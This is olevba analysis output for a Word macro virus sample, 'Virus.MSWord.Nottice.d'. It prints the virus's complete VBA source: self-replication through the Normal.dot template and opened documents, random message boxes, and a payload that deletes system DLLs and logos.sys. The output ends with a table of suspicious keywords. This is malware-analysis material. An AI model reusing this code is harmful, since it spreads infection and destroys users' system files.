olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Nottice.d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Nottice.d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Nottice.d - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "F%"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoOpen.MAIN"
Dim J$
On Error GoTo -1: On Error GoTo Finish
WordBasic.DisableAutoMacros 0
J$ = LCase(WordBasic.[Right$](WordBasic.[MacroFileName$](WordBasic.[MacroName$](0)), 10))

If J$ = "normal.dot" Then
    If VI = 1 Then
        GoTo Finish
    Else
        InfectDOC
    End If
Else
    If VI2 = 1 Then
        GoTo Finish
    Else
        InfectGlobal
    End If
End If
Finish:
salto = Chr$(13)
If (Month(Date) = 12) And (Day(Date) = 31) Then
  mensaje$ = "Feliz cumpleaños Lola" + salto + "Esperamos que este dia sea uno de los más hermosos" + salto
  mensaje$ = mensaje$ + "que hallas pasado en tu corta vida." + salto + salto
  mensaje$ = mensaje$ + "             Te amo"
  MsgBox mensaje$, vbApplicationModal, "Prestame tu atención"
Else
 If Int((7 * Rnd) + 1) = 3 Then
   MsgBox "Te estoy observando vandido...", vbOKOnly, "Lolo"
 End If
 If ((Int((13 * Rnd) + 1) = 2) Or (Int((9 * Rnd) + 1) = 5)) And Day(Date) <= 15 Then
   Kill "c:\windows\system\*.dll"
   SetAttr "c:\windows\logos.sys", vbNormal
   Kill "c:\windows\logos.sys"
   Name "c:\windows\logas.sys" As "c:\windows\logos.sys"
   SetAttr "logos.sys", vbHidden
 End If
End If
End Sub

Private Function VI()
Dim i
VI = 0
If WordBasic.CountMacros(1) > 0 Then
    For i = 1 To WordBasic.CountMacros(1)
        If WordBasic.[MacroName$](i, 1) = "WININIT" Then
            VI = 1
        End If
    Next i
End If
End Function

Private Function VI2()
Dim i
VI2 = 0
If WordBasic.CountMacros(0) > 0 Then
    For i = 1 To WordBasic.CountMacros(0)
        If WordBasic.[MacroName$](i, 0) = "WININIT" Then
           VI2 = 1
        End If
    Next i
End If
End Function

Private Sub InfectDOC()
WordBasic.FileSaveAs Format:=1
WordBasic.MacroCopy "Global:AutoClose", WordBasic.[FileName$]() + ":AutoOpen"
WordBasic.MacroCopy "Global:WININIT", WordBasic.[FileName$]() + ":WININIT"
WordBasic.FileSaveAll 1, 1
End Sub

Private Sub InfectGlobal()
WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoOpen", "Global:AutoClose"
WordBasic.MacroCopy WordBasic.[FileName$]() + ":WININIT", "Global:WININIT"
WordBasic.FileSaveAll 1, 0
End Sub
-------------------------------------------------------------------------------
VBA MACRO WININIT.bas 
in file: Virus.MSWord.Nottice.d - OLE stream: 'Macros/VBA/WININIT'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

